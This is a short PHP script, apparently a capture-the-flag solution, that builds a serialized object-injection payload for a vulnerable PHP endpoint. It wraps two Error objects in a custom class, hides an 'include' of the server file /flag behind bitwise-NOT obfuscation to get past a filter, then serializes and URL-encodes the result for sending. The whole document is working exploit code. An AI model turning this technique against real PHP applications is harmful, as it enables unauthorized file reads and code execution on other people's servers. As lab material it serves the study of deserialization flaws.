<?php
class SYCLOVER {
    public $syc;
    public $lover;

    public function __construct($b,$c){
        $this->syc = $b;
        $this->lover = $c;
    }
}
$in="/flag";
$payload = "?><?=include~".~$in."?>";
$b = new error($payload,1);$c=new error($payload,2);
$a = new SYCLOVER($b,$c);
echo(urlencode(serialize($a)));
?>